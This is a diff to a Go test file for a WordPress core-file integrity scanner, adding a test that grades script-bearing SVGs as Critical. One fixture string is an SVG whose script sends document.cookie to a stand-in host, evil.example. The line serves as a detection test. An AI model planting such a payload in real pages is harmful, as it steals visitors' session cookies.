@@ -4,6 +4,8 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 
@@ -71,8 +73,8 @@ func TestCheckWPCoreReportsModifiedCoreFile(t *testing.T) {
 // longer matches the release its files came from. Those still deserve a
 // finding, just not one that acts on its own.
 func TestCheckWPCoreGradesNonExecutableCoreFilesBelowCritical(t *testing.T) {
-	wpCoreCheckMocks(t, "Warning: File doesn't verify against checksum: wp-includes/js/mediaelement/controls.svg\n"+
-		"Warning: File doesn't verify against checksum: wp-includes/css/dashicons.css\n"+
+	wpCoreCheckMocks(t, "Warning: File doesn't verify against checksum: wp-includes/css/dashicons.css\n"+
+		"Warning: File doesn't verify against checksum: wp-includes/images/w-logo-blue.png\n"+
 		"Warning: File doesn't verify against checksum: wp-includes/plugin.php\n")
 
 	got := coreIntegrityFindings(CheckWPCore(context.Background(), &config.Config{}, nil))
@@ -84,8 +86,8 @@ func TestCheckWPCoreGradesNonExecutableCoreFilesBelowCritical(t *testing.T) {
 		bySeverity[f.FilePath] = f.Severity
 	}
 	for _, path := range []string{
-		"/home/alice/public_html/wp-includes/js/mediaelement/controls.svg",
 		"/home/alice/public_html/wp-includes/css/dashicons.css",
+		"/home/alice/public_html/wp-includes/images/w-logo-blue.png",
 	} {
 		if got := bySeverity[path]; got != alert.High {
 			t.Errorf("severity for %s = %v, want High", path, got)
@@ -93,6 +95,38 @@ func TestCheckWPCoreGradesNonExecutableCoreFilesBelowCritical(t *testing.T) {
 	}
 	if got := bySeverity["/home/alice/public_html/wp-includes/plugin.php"]; got != alert.Critical {
 		t.Errorf("severity for the PHP core file = %v, want Critical", got)
+	}
+}
+
+// SVG is markup, not an image format: it carries <script> and event handlers,
+// and the browser runs them. A core SVG that gained active content is a real
+// compromise, so the grading has to look at what is in the file rather than
+// trust the extension.
+func TestCheckWPCoreKeepsActiveSVGCritical(t *testing.T) {
+	dir := t.TempDir()
+	install := filepath.Join(dir, "public_html")
+	svgDir := filepath.Join(install, "wp-includes", "js")
+	if err := os.MkdirAll(svgDir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	active := "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('//evil.example/'+document.cookie)</script></svg>"
+	if err := os.WriteFile(filepath.Join(svgDir, "active.svg"), []byte(active), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	inert := "<svg xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M0 0h10v10H0z\"/></svg>"
+	if err := os.WriteFile(filepath.Join(svgDir, "inert.svg"), []byte(inert), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	if got := wpCoreModifiedSeverity(filepath.Join(install, "wp-includes/js/active.svg"), "wp-includes/js/active.svg"); got != alert.Critical {
+		t.Errorf("severity for an SVG carrying script = %v, want Critical", got)
+	}
+	if got := wpCoreModifiedSeverity(filepath.Join(install, "wp-includes/js/inert.svg"), "wp-includes/js/inert.svg"); got != alert.High {
+		t.Errorf("severity for a drawing-only SVG = %v, want High", got)
+	}
+	// An unreadable file is not evidence of innocence.
+	if got := wpCoreModifiedSeverity(filepath.Join(install, "wp-includes/js/gone.svg"), "wp-includes/js/gone.svg"); got != alert.Critical {
+		t.Errorf("severity for an unreadable SVG = %v, want Critical", got)
 	}
 }
 
